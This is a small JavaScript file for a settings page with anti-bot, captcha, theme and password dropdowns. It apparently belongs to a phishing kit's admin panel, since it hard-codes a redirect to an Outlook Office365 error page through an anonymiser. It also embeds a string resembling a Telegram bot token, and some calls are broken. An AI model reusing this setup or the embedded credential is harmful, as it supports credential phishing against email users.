const url = "https://href.li/?https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11";
// Set the maximum allowed length for the URL before truncating
const maxLength = 30;

// Get the span element to display the URL
const urlSpan = document.getElementById('redirect-url');

// Check if the URL length exceeds the maximum length
if (url.length > maxLength) {
    // Truncate the URL and add an ellipsis
    urlSpan.textContent = url.substring(0, maxLength) + '...';
} else {
    // If the URL is within the limit, display it fully
    urlSpan.textContent = url;
}


// offices
function toggleDropdown(dropdownId) {
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('hidden');
    dropdown.classList.toggle('opacity-100');
    dropdown.classList.toggle('scale-100');
  }

  function selectOption(option) {
    // Update the dropdown label with the selected option
    document.getElementById('dropdown-label').textContent = option;

    // Close the dropdown after selection
    toggleDropdown('dropdown-content');
  }

  
//   Captcha Theme
function toggleDropdowns(dropdownId) {
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('hidden');
    dropdown.classList.toggle('opacity-100');
    dropdown.classList.toggle('scale-100');
  }

  function selectOpt(option) {
    // Update the dropdown label with the selected option
    document.getElementById('dropdown-labels').textContent = option;

    // Close the dropdown after selection
    toggleDropdown('dropdown-contents');
  }

//   startup Of theme

function toggleDrop(dropdownId) {
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('hidden');
    dropdown.classList.toggle('opacity-100');
    dropdown.classList.toggle('scale-100');
  }

  function selectOptioning(option) {
    // Update the dropdown label with the selected option
    document.getElementById('dropdown-labelss').textContent = option;

    // Close the dropdown after selection
    toggleDrop('dropdown-conten');
  }


  // Theme

function toggleDro(dropdownId) {
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('hidden');
    dropdown.classList.toggle('opacity-100');
    dropdown.classList.toggle('scale-100');
  }

  function selectOptionin(option) {
    // Update the dropdown label with the selected option
    document.getElementById('dropdown-lab').textContent = option;

    // Close the dropdown after selection
    toggleDro('dropdown-cont');
  }


//   password text
  function togglen(dropdownId) {
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('hidden');
    dropdown.classList.toggle('opacity-100');
    dropdown.classList.toggle('scale-100');
  }

  function selectOptioned(option) {
    // Update the dropdown label with the selected option
    document.getElementById('dropdown-la').textContent = option;

    // Close the dropdown after selection
    togglen('dropdown-c');
  }


  //  <!-- Anti Bot Level  -->
  const urls = " 5588925439:AAHhnOerindYZvOshcag8SL5cPCjot7pN7Q";
  // Set the maximum allowed length for the URL before truncating
const maxLengths = 30;

// Get the span element to display the URL
const urlsSpan = document.getElementById('redirect-urls');

// Check if the URL length exceeds the maximum length
if (urls.length > maxLength) {
    // Truncate the urls and add an ellipsis
    urlsSpan.textContent = urls.substring(0, maxLength) + '...';
} else {
    // If the urls is within the limit, display it fully
    urlsSpan.textContent = urls;
}




//   aniti bot
function toggls(dropdownId) {
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('hidden');
    dropdown.classList.toggle('opacity-100');
    dropdown.classList.toggle('scale-100');
  }

  function selectOptions(option) {
    // Update the dropdown label with the selected option
    document.getElementById('dropdownd').textContent = option;

    // Close the dropdown after selection
    toggl('dropdows');
  }
